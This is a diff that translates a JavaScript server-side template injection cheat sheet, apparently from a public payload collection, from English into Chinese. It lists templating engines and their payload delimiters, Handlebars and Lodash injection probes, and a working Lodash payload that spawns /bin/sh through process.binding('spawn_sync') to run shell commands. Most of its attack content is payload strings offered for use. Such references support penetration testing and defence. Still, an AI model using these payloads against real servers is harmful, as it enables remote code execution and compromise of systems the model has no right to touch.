@@ -1,21 +1,23 @@
-# Server Side Template Injection - JavaScript
+[原文文档](JavaScript.en.md)
 
-> Server-Side Template Injection (SSTI)  occurs when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In the context of JavaScript, SSTI vulnerabilities can arise when using server-side templating engines like Handlebars, EJS, or Pug, where user input is integrated into templates without adequate sanitization.
+# 服务器端模板注入 - JavaScript
 
-## Summary
+> 服务器端模板注入（SSTI）发生在攻击者可以将恶意代码注入服务器端模板中，导致服务器执行任意命令。在JavaScript上下文中，当使用服务器端模板引擎（如Handlebars、EJS或Pug）时，如果用户输入被集成到模板中而没有足够的清理，就会出现SSTI漏洞。
 
-- [Templating Libraries](#templating-libraries)
+## 概述
+
+- [模板库](#模板库)
 - [Handlebars](#handlebars)
-    - [Handlebars - Basic Injection](#handlebars---basic-injection)
-    - [Handlebars - Command Execution](#handlebars---command-execution)
+    - [Handlebars - 基本注入](#handlebars---基本注入)
+    - [Handlebars - 命令执行](#handlebars---命令执行)
 - [Lodash](#lodash)
-    - [Lodash - Basic Injection](#lodash---basic-injection)
-    - [Lodash - Command Execution](#lodash---command-execution)
-- [References](#references)
+    - [Lodash - 基本注入](#lodash---基本注入)
+    - [Lodash - 命令执行](#lodash---命令执行)
+- [参考资料](#参考资料)
 
-## Templating Libraries
+## 模板库
 
-| Template Name | Payload Format |
+| 模板名称 | 负载格式 |
 | ------------ | --------- |
 | DotJS        | `{{= }}`  |
 | DustJS       | `{}`      |
@@ -33,19 +35,19 @@
 
 ## Handlebars
 
-[Official website](https://handlebarsjs.com/)
-> Handlebars compiles templates into JavaScript functions.
+[官方网站](https://handlebarsjs.com/)
+> Handlebars将模板编译为JavaScript函数。
 
-### Handlebars - Basic Injection
+### Handlebars - 基本注入
 
 ```js
 {{this}}
 {{self}}
 ```
 
-### Handlebars - Command Execution
+### Handlebars - 命令执行
 
-This payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6):
+此负载仅在handlebars版本中有效，在[GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6)中修复：
 
 - `>= 4.1.0`, `< 4.1.2`
 - `>= 4.0.0`, `< 4.0.14`
@@ -77,12 +79,12 @@ This payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](ht
 
 ## Lodash
 
-[Official website](https://lodash.com/docs/4.17.15)
-> A modern JavaScript utility library delivering modularity, performance & extras.
+[官方网站](https://lodash.com/docs/4.17.15)
+> 一个提供模块化、性能和额外功能的现代JavaScript工具库。
 
-### Lodash - Basic Injection
+### Lodash - 基本注入
 
-How to create a template:
+如何创建模板：
 
 ```javascript
 const _ = require('lodash');
@@ -96,12 +98,12 @@ const options = {
 _.template(string, options);
 ```
 
-- **string:** The template string.
-- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.
-- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.
-- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.
+- **string：**模板字符串。
+- **options.interpolate：**一个正则表达式，指定HTML *interpolate*分隔符。
+- **options.evaluate：**一个正则表达式，指定HTML *evaluate*分隔符。
+- **options.escape：**一个正则表达式，指定HTML *escape*分隔符。
 
-For the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.
+为了实现RCE，模板的分隔符由**options.evaluate**参数确定。
 
 ```javascript
 {{= _.VERSION}}
@@ -114,13 +116,13 @@ ${= _.VERSION}
 <%= _.VERSION %>
 ```
 
-### Lodash - Command Execution
+### Lodash - 命令执行
 
 ```js
 {{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
 ```
 
-## References
+## 参考资料
 
-- [Exploiting Less.js to Achieve RCE - Jeremy Buis - July 1, 2021](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
-- [Handlebars template injection and RCE in a Shopify app - Mahmoud Gamal - April 4, 2019](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
+- [利用Less.js实现RCE - Jeremy Buis - 2021年7月1日](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
+- [Shopify应用程序中的Handlebars模板注入和RCE - Mahmoud Gamal - 2019年4月4日](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
